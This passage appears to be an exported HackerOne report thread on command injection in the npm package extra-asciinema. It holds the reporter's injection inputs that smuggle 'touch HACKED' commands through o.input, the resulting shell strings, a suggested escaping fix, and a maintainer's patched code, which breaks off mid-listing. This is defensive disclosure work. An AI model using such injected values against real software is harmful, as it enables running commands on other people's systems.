class=\"na\"\u003eencoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eutf8\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efrej\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003efres\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003efn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003efn\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"k\"\u003eexport\u003c/span\u003e \u003cspan class=\"k\"\u003edefault\u003c/span\u003e \u003cspan class=\"nx\"\u003erec\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// https://github.com/nodef/extra-asciinema/blob/master/src/recSync.ts#L24\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eRecOptions\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emkdtempSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eos\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etmpdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003easciinema-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e0.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003ecp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexecFileSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003easciinema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003erecCmd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003eencoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eutf8\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"k\"\u003eexport\u003c/span\u003e \u003cspan class=\"k\"\u003edefault\u003c/span\u003e \u003cspan class=\"nx\"\u003erecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf \u003ccode\u003eo.input\u003c/code\u003e is \u003ccode\u003e\u0026quot;; touch HACKED1\u0026quot;\u003c/code\u003e, the \u003ccode\u003eo.command\u003c/code\u003e will be \u003ccode\u003ecd . \u0026amp;\u0026amp; cat \u0026quot;\u0026quot;; touch HACKED1\u0026quot;\u0026quot; | node -i\u003c/code\u003e, while\u003cbr\u003e\nif \u003ccode\u003eo.input\u003c/code\u003e is \u003ccode\u003e./`touch HACKED3`/../\u003c/code\u003e,  the \u003ccode\u003eo.command\u003c/code\u003e will be \u003ccode\u003e\u0026#39;cd ./`touch HACKED3` \u0026amp;\u0026amp; cat \u0026quot;..\u0026quot; | node -i\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eIn this case, since you are calling the \u003ccode\u003ecd\u003c/code\u003e and \u003ccode\u003ecat\u003c/code\u003e commands (in the first case you need a directory while in the second case a filename), in my opinion, it is better to sanitize the value of \u003ccode\u003eo.input\u003c/code\u003e in order to avoid the above issues.\u003c/p\u003e\n\n\u003cp\u003eI attached a poc video.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"poc2_extra-asciinema.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NXqfAFi9pGJKj36m22v2qbYu?response-content-disposition=attachment%3B%20filename%3D%22poc2_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc2_extra-asciinema.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070256Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=e651cc5ba6c8fa84b8347d71b8913cb87e65b940dc0ec0e2f64c9a6113882c2e\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NXqfAFi9pGJKj36m22v2qbYu?response-content-disposition=attachment%3B%20filename%3D%22poc2_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc2_extra-asciinema.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070256Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=e651cc5ba6c8fa84b8347d71b8913cb87e65b940dc0ec0e2f64c9a6113882c2e\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/danielruf\"\u003e@danielruf\u003c/a\u003e and \u003ca href=\"/wolfram77\"\u003e@wolfram77\u003c/a\u003e please let me know what do you think about that.\u003c/p\u003e\n\n\u003cp\u003eSome resources that could be helpful:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\" href=\"/redirect?url=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FOS_Command_Injection_Defense_Cheat_Sheet.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fevilpacket%2F5a9655c752982faf7c4ec6450c1cbf1b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eA possible solution could be similar to this one (it\u0026#39;s just a suggestion, feel free to choose what whatever you think best):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/418sec/node-git-wrapper/pull/3/files\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2F418sec%2Fnode-git-wrapper%2Fpull%2F3%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/418sec/node-git-wrapper/pull/3/files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eescapeSpecialChars\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecmd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecmd\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e([\u003c/span\u003e\u003cspan class=\"sr\"\u003e`$\u0026amp;{}[;|\u003c/span\u003e\u003cspan class=\"se\"\u003e])\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erecCmd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003edir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edirname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eescapeSpecialChars\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003efil\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebasename\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eescapeSpecialChars\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`cd \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003edir\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u0026amp;\u0026amp; cat \u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003efil\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot; | node -i`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThank you for your time,\u003cbr\u003e\nd3lla\u003c/p\u003e\n\n\u003cp\u003eI tested using the following configurations:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v14.2.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-07-26T16:44:59.648Z","updated_at":"2020-07-26T16:44:59.648Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":923982,"filename":"poc2_extra-asciinema.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NXqfAFi9pGJKj36m22v2qbYu?response-content-disposition=attachment%3B%20filename%3D%22poc2_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc2_extra-asciinema.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070256Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026X-Amz-Signature=e651cc5ba6c8fa84b8347d71b8913cb87e65b940dc0ec0e2f64c9a6113882c2e"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8758618,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I managed to not put the change in 1 commit, so i put the changed code here. Also in your POC video i noticed a `fn is not defined` error. Null check was on the wrong variable. Also changed that. Now when i run your POC, no `HACKED` file is created.\n\n```javascript\nfunction escapePath(p) {\n  return p.replace(/[`$\u0026{}[;|]/g, '');\n}\n\nfunction recCmd(f: string, o: any=null): string[] {\n  var o = o||{};\n  // if input file given, execute on node.js\n  if(o.input) {\n    var pth = escapePath(o.input);\n    var dir = path.dirname(pth);\n    var fil = path.basename(pth);\n    o.command = `cd \"${dir}\" \u0026\u0026 cat \"${fil}\" | node -i`;\n  }\n```\n","markdown_message":"\u003cp\u003eI managed to not put the change in 1 commit, so i put the changed code here. Also in your POC video i noticed a \u003ccode\u003efn is not defined\u003c/code\u003e error. Null check was on the wrong variable. Also changed that. Now when i run your POC, no \u003ccode\u003eHACKED\u003c/code\u003e file is created.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eescapePath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e[\u003c/span\u003e\u003cspan class=\"sr\"\u003e`$\u0026amp;{}[;|\u003c/span\u003e\u003cspan class=\"se\"\u003e]\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erecCmd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eany\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e[]\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e \u003cspan 